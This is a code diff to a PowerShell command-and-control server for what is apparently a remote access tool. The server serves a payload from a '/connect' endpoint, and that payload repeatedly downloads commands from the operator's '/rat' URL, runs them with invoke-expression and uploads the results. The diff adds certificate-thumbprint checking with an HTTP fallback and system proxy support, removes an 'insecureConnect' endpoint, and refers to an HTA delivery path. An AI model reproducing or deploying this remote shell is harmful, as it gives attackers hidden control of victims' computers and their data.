@@ -157,63 +157,59 @@ while ($true) {
 	$hostip = $request.RemoteEndPoint
 	#Use this for One-Liner Start
 	if ($request.Url -match '/connect$' -and ($request.HttpMethod -eq "GET")) {  
-     write-host "Secure Host Connected" -fore Cyan
         $message = '
-					[System.Net.ServicePointManager]::MaxServicePoints = 1
-					[System.Net.ServicePointManager]::MaxServicePointIdleTime = 1
-					[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {
-						
-						$ThumbPrint = "'+$sslThumbprint+'"
-						$certificate = [System.Security.Cryptography.X509Certificates.X509Certificate2]$args[1]
-					 
-						if($certificate -eq $null)
-						{
-							$Host.UI.WriteErrorLine("Null certificate.")
-							return $false
-						}
-					 
-						if ($certificate.Thumbprint -eq $ThumbPrint)
-						{
-							return $true
-						}
-						else
-						{
-							$Host.UI.WriteErrorLine("Thumbprint mismatch. Certificate thumbprint $($certificate.Thumbprint)")
-						}
-						
-						return $false
+					
+					$sslThumbprint = "'+$sslThumbprint+'"
+					
+					function Invoke-CertCheck ()
+					{	
+						$Uri = "https://'+$Server+'/rat"
+						[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+						$request = [System.Net.HttpWebRequest]::Create($uri)
+						$request.GetResponse().Dispose()
+						$servicePoint = $request.ServicePoint
+						[System.Security.Cryptography.X509Certificates.X509Certificate2]$cert = $servicePoint.Certificate
+						return $cert.Thumbprint
 					}
-
+					
+					$crt = Invoke-CertCheck
+					if($crt -eq $sslThumbprint)
+					{
+						$h = "https://"
+					}
+					else
+					{
+						$h = "http://"
+					}
 					
 					
-					try
+					$p = [System.Net.WebRequest]::GetSystemWebProxy()
+					$s = $h +"' + $Server + '/rat"
+					$w = New-Object Net.WebClient 
+					$w.Proxy = $p
+					while($true)
 					{
-						$s = "https://' + $Server + '/rat"
-						$w = New-Object Net.WebClient 
-						while($true)
-						{
-							$r = $w.DownloadString("$s")
-							while($r) {
-								$o = invoke-expression $r | out-string 
-								$w.UploadString("$s", $o)	
-								break
-							}
+						$r = $w.DownloadString("$s")
+						while($r) {
+							$o = invoke-expression $r | out-string 
+							$w.UploadString("$s", $o)	
+							break
 						}
 					}
-					catch [System.Exception]
-					{
-						
-					}
+					
+					
 		'
-
+	
     }		 
 	
 	if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq "POST") ) { 
 		Receive-Request($request)	
 	}
     if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq "GET")) {  
+		$c = "PS-HTTP"
+		if($request.IsSecureConnection) {$c = "PS-HTTPS"}
         $response.ContentType = 'text/plain'
-        $message = Read-Host "PS $hostip>"		
+        $message = Read-Host "$c $hostip>"		
     }
     if ($request.Url -match '/app.hta$' -and ($request.HttpMethod -eq "GET")) {
 		$enc = [system.Text.Encoding]::UTF8
@@ -238,23 +234,7 @@ while ($true) {
 		continue
 	}
     
-	if ($request.Url -match '/insecureConnect$' -and ($request.HttpMethod -eq "GET")) {  
-     write-host "Insecure Host Connected" -fore Red
-        $message = '					
-					$s = "http://' + $Server + '/rat"
-					$w = New-Object Net.WebClient 
-					while($true)
-					{
-						$r = $w.DownloadString("$s")
-						while($r) {
-							$o = invoke-expression $r | out-string 
-							$w.UploadString("$s", $o)	
-							break
-						}
-					}
-		'
-
-    }		 
+	
 	
     [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
     $response.ContentLength64 = $buffer.length
